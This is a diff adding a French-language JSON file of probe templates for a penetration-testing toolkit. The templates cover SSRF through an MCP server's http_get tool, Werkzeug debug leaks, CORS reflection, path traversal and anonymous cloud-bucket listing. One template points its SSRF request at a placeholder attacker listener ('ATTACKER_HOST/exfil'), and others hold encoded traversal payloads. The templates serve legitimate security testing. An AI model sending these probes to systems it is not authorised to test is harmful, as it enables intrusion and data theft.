@@ -1,0 +1,166 @@
+{
+  "templates": [
+    {
+      "id": "ssrf_mcp_http_get",
+      "name": "SSRF via outil MCP http_get",
+      "rtk_module": "llm_mcp.exfil_channels (RTK-13/14)",
+      "category": "LLM / MCP",
+      "severity": "critical",
+      "description": "Invoque l'outil http_get d'un serveur MCP (FastMCP) sans allowlist de sortie, pour vérifier s'il agit comme proxy réseau arbitraire (SSRF).",
+      "owasp": ["A10:2021 – Server-Side Request Forgery (SSRF)", "LLM01: Prompt Injection"],
+      "mitre_attack": ["T1199: Trusted Relationship", "T1537: Transfer Data to Cloud Account"],
+      "parameters": [
+        {"key": "mcp_base_url", "label": "URL de base du serveur MCP", "default": "https://CHANGE-ME.run.app"},
+        {"key": "ssrf_target", "label": "URL cible SSRF (listener contrôlé)", "default": "http://ATTACKER_HOST:8000/exfil"}
+      ],
+      "requests": [
+        {
+          "name": "tools/list (découverte des outils exposés)",
+          "method": "POST",
+          "url": "{{mcp_base_url}}/mcp",
+          "headers": {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"},
+          "body": "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\"}"
+        },
+        {
+          "name": "tools/call http_get -> cible SSRF",
+          "method": "POST",
+          "url": "{{mcp_base_url}}/mcp",
+          "headers": {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"},
+          "body": "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"http_get\",\"arguments\":{\"url\":\"{{ssrf_target}}\"}}}"
+        }
+      ],
+      "indicators": ["\"result\"", "content", "http_get", "tools"]
+    },
+    {
+      "id": "debug_stacktrace_trigger",
+      "name": "Déclenchement de stack trace (mode debug Flask/Werkzeug)",
+      "rtk_module": "secrets.error_leakage (RTK-02)",
+      "category": "Secrets / Misconfiguration",
+      "severity": "high",
+      "description": "Envoie des payloads JSON malformés ou incomplets vers un endpoint afin de provoquer une exception non interceptée et vérifier la fuite de stack trace (chemins, secrets, versions de libs).",
+      "owasp": ["A05:2021 – Security Misconfiguration", "A09:2021 – Security Logging and Monitoring Failures"],
+      "mitre_attack": ["T1592: Gather Victim Host Information", "T1590: Gather Victim Network Information"],
+      "parameters": [
+        {"key": "target_base_url", "label": "URL de base du service", "default": "https://CHANGE-ME"},
+        {"key": "endpoint_path", "label": "Chemin de l'endpoint vulnérable", "default": "/process"}
+      ],
+      "requests": [
+        {
+          "name": "JSON invalide (parse error)",
+          "method": "POST",
+          "url": "{{target_base_url}}{{endpoint_path}}",
+          "headers": {"Content-Type": "application/json"},
+          "body": "ceci-nest-pas-du-json"
+        },
+        {
+          "name": "JSON valide mais clé attendue absente",
+          "method": "POST",
+          "url": "{{target_base_url}}{{endpoint_path}}",
+          "headers": {"Content-Type": "application/json"},
+          "body": "{}"
+        },
+        {
+          "name": "Sonde du débogueur Werkzeug interactif",
+          "method": "GET",
+          "url": "{{target_base_url}}{{endpoint_path}}?__debugger__=yes&cmd=resource&f=debugger.js",
+          "headers": {}
+        }
+      ],
+      "indicators": ["Traceback (most recent call last)", "werkzeug", "File \"/app", "KeyError", "debugger.js"]
+    },
+    {
+      "id": "cors_credentials_probe",
+      "name": "CORS permissif + Access-Control-Allow-Credentials",
+      "rtk_module": "buckets.cors_traversal (RTK-05)",
+      "category": "Applications conteneurisées",
+      "severity": "high",
+      "description": "Envoie plusieurs en-têtes Origin distincts et vérifie si le serveur les réfléchit tels quels dans Access-Control-Allow-Origin, combiné à Access-Control-Allow-Credentials: true.",
+      "owasp": ["A01:2021 – Broken Access Control", "A05:2021 – Security Misconfiguration"],
+      "mitre_attack": ["T1190: Exploit Public-Facing Application"],
+      "parameters": [
+        {"key": "target_base_url", "label": "URL de base du service conteneurisé", "default": "https://CHANGE-ME"},
+        {"key": "resource_path", "label": "Ressource existante (ex: tuile, fichier public)", "default": "/tile_1_1.png"},
+        {"key": "evil_origin", "label": "Origin tiers de test", "default": "https://site-malveillant.example"}
+      ],
+      "requests": [
+        {
+          "name": "Preflight OPTIONS avec Origin tiers",
+          "method": "OPTIONS",
+          "url": "{{target_base_url}}{{resource_path}}",
+          "headers": {"Origin": "{{evil_origin}}", "Access-Control-Request-Method": "GET"}
+        },
+        {
+          "name": "GET avec Origin tiers (réflexion + credentials)",
+          "method": "GET",
+          "url": "{{target_base_url}}{{resource_path}}",
+          "headers": {"Origin": "{{evil_origin}}"}
+        },
+        {
+          "name": "GET avec second Origin de contrôle (null)",
+          "method": "GET",
+          "url": "{{target_base_url}}{{resource_path}}",
+          "headers": {"Origin": "null"}
+        }
+      ],
+      "indicators": ["access-control-allow-credentials: true", "access-control-allow-origin"]
+    },
+    {
+      "id": "path_traversal_probe",
+      "name": "Traversée de chemin (sonde multi-encodage)",
+      "rtk_module": "buckets.cors_traversal (RTK-05)",
+      "category": "Applications conteneurisées",
+      "severity": "medium",
+      "description": "Teste plusieurs variantes d'encodage d'une traversée de chemin (../, %2e%2e, double-encodage) contre une ressource statique servie par le conteneur.",
+      "owasp": ["A01:2021 – Broken Access Control"],
+      "mitre_attack": ["T1083: File and Directory Discovery"],
+      "parameters": [
+        {"key": "target_base_url", "label": "URL de base du service", "default": "https://CHANGE-ME"},
+        {"key": "secret_filename", "label": "Nom du fichier hors répertoire (connu/décoy)", "default": "secret.txt"}
+      ],
+      "requests": [
+        {"name": "Traversée brute (../)", "method": "GET", "url": "{{target_base_url}}/../{{secret_filename}}", "headers": {}},
+        {"name": "Traversée URL-encodée simple", "method": "GET", "url": "{{target_base_url}}/%2e%2e/{{secret_filename}}", "headers": {}},
+        {"name": "Traversée avec slash encodé", "method": "GET", "url": "{{target_base_url}}/..%2f{{secret_filename}}", "headers": {}},
+        {"name": "Double encodage", "method": "GET", "url": "{{target_base_url}}/%252e%252e/{{secret_filename}}", "headers": {}}
+      ],
+      "indicators": ["TOP-SECRET-DECOY"]
+    },
+    {
+      "id": "bucket_public_listing_probe",
+      "name": "Listing public de bucket / objet accessible",
+      "rtk_module": "buckets.enum_buckets (RTK-04)",
+      "category": "Cloud Storage",
+      "severity": "high",
+      "description": "Vérifie si un bucket de stockage (S3/GCS/Blob) expose un listing public ou autorise une lecture anonyme d'objet.",
+      "owasp": ["A01:2021 – Broken Access Control", "A05:2021 – Security Misconfiguration"],
+      "mitre_attack": ["T1530: Data from Cloud Storage Object"],
+      "parameters": [
+        {"key": "bucket_listing_url", "label": "URL de listing du bucket (ex: endpoint XML/JSON)", "default": "https://CHANGE-ME.s3.amazonaws.com/?list-type=2"},
+        {"key": "object_url", "label": "URL directe d'un objet connu/décoy", "default": "https://CHANGE-ME.s3.amazonaws.com/decoy-object.txt"}
+      ],
+      "requests": [
+        {"name": "Listing anonyme du bucket", "method": "GET", "url": "{{bucket_listing_url}}", "headers": {}},
+        {"name": "Lecture anonyme d'un objet", "method": "GET", "url": "{{object_url}}", "headers": {}}
+      ],
+      "indicators": ["<ListBucketResult", "\"items\"", "<EnumerationResults", "AccessDenied"]
+    },
+    {
+      "id": "generic_custom_request",
+      "name": "Requête libre (sonde générique)",
+      "rtk_module": "custom",
+      "category": "Générique",
+      "severity": "info",
+      "description": "Gabarit vide pour construire une sonde personnalisée à la main depuis l'onglet Requêtes générées.",
+      "owasp": [],
+      "mitre_attack": [],
+      "parameters": [
+        {"key": "target_base_url", "label": "URL de base", "default": "https://CHANGE-ME"},
+        {"key": "endpoint_path", "label": "Chemin", "default": "/"}
+      ],
+      "requests": [
+        {"name": "Requête libre", "method": "GET", "url": "{{target_base_url}}{{endpoint_path}}", "headers": {}}
+      ],
+      "indicators": []
+    }
+  ]
+}
